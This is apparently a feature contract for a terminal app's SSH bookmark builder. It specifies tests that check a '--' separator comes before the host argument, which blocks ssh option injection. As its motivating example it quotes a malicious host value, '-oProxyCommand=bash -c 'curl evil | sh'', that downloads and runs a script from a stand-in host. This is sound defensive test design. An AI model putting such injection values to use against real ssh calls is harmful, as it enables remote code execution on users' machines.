# Feature contract — SSH bookmark command includes `--` separator

## Motivation

OpenSSH parses its argv left-to-right. A host argument whose value
begins with `-` is treated as an option, enabling CVE-2017-1000117-
class command injection: a bookmark like
```
host = -oProxyCommand=bash -c 'curl evil | sh'
```
shell-quotes fine (the shell passes the value verbatim) but `ssh`
itself then interprets the leading `-o`, expanding `ProxyCommand`
into attacker-chosen shell. Shell-quoting alone does not defend
against this; only the POSIX argv-terminator `--` does.

The 0.7.7 fix added `args << "--"` in `SshBookmark::toSshCommand`
immediately before the host position. The contract this locks:

## Invariants

**I1 — The generated command contains a bare `--` separator between
the last SSH option block and the host argument.** This is the
argv terminator that forbids any remaining argument from being
parsed as an SSH option.

**I2 — `--` appears before the host.** Ordering matters — `--`
after the host does nothing, because `ssh` has already bound the
first non-option arg to the host role.

**I3 — Invariant holds regardless of whether a `user@` prefix is
present, whether `identityFile` is set, whether `ControlMaster` is
requested, and whether `extraArgs` is populated.** All optional
branches in the builder must still emit `--`.

## Scope

In scope: the output string of `SshBookmark::toSshCommand()`.
The test builds `SshBookmark` values with various field combinations
and inspects the returned command line for `--` in the correct
position.

Out of scope:
- Whether OpenSSH itself honours `--` (it has since before Ants
  existed; not our property to test).
- Shell-quoting correctness of the host value — tested implicitly
  via the shared `shellQuote` helper; not this spec.
- Whether the dash-prefixed host is *rejected* before reaching ssh.
  The 0.7.7 design choice was explicit: allow the value, rely on
  `--` to neutralise it. Rejecting dash-prefixed hosts outright
  would block some legitimate power-user cases where the bookmark
  exists to test ssh edge behaviour.

## Test execution

`test_ssh_dash.cpp` constructs `SshBookmark` in four scenarios
(plain host, user@host, host + identity file, host + extra args)
and asserts:

1. `cmd.contains(" -- ")` — the separator is present.
2. `cmd.indexOf(" -- ") < cmd.lastIndexOf(host)` — separator
   precedes the host position.
3. A malicious host value (`-oProxyCommand=evil`) does NOT cause
   a token starting with `-oProxyCommand=` to appear at any
   position before the `--` separator.

Exit 0 on all four scenarios holding; non-zero with the failing
scenario printed otherwise.
